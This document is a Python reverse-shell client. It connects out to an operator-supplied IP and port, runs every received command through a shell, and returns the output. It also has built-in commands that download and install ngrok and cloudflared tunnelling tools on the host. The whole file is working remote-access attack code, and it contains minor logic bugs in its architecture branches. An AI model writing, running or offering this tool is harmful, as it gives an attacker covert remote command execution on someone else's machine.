import socket
import subprocess
import os
import sys
import platform

def main(port, host):
    client = socket.socket()
    client.connect((host, port))

    while True:
        command = client.recv(1024).decode('utf-8')
        if command == 'exit':
            break
#installing ngrok
        if command == 'ingrok':
           os.system("apt update && apt upgrade -y")
           os.system("apt install unzip wget")
           architecture = platform.architecture()[0]
           print("The architecture of this device is:", architecture)
           if architecture =='64bit':
              os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip")
              os.system("unzip ngrok-stable-linux-arm64.zip")
              os.system("chmod +x ngrok")
              client.send("Ngrok installed succesfully!".encode('utf-8'))
           else:
              continue
           if architecture =='32bit':
              os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip")
              os.system("unzip ngrok-stable-linux-386.zip")
              os.system("chmod +x ngrok")
              client.send("Ngrok installed succesfully!".encode('utf-8'))
#installing cloudflared

        if command =='icloudflared':
           os.system("apt update && apt upgrade")
           os.system("apt install unzip wget")
           architecture = platform.architecture()[0]
           print("The architecture of this device is:", architecture)
           if architecture =='64bit':
              os.system("wget https://github.com/cloudflare/cloudflared/releases/download/2023.2.1/cloudflared-linux-arm64")
              os.system("chmod +x cloudflared-linux-arm64")
              os.system("mv cloudflared-linux-arm64 cloudflared")
              client.send("Cloudflared succesfully installed!".encode('utf-8'))
           else:
              continue
           if architecture =='32bit':
              os.system("wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386")
              os.system("chmod +x cloudflared-linux-386")
              os.system("mv cloudflared-linux-386 cloudflared")
              client.send("Cloudflared installed succesfully!".encode('utf-8'))
#checking arch
        if command =='arch':
           architecture = platform.architecture()[0]
           print("The architecture of this device is:", architecture)

           if architecture =='64bit':
              client.send("Device architecture is 64bit".encode('utf-8'))

           if architecture =='32bit':
              client.send("Device architecture is 32bit".encode('utf-8'))




        if command.startswith("cd "):
            try:
                os.chdir(command[3:].strip())
                client.send("Directory changed successfully".encode('utf-8'))
            except FileNotFoundError:
                client.send("Error: No such file or directory".encode('utf-8'))
        else: 
            output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            output_str = output.stdout + output.stderr
            client.send(output_str.encode('utf-8'))

if __name__ == '__main__':
    port = int(input('Enter port number: '))
    host = input("Enter the IP address: ")
    main(port, host)
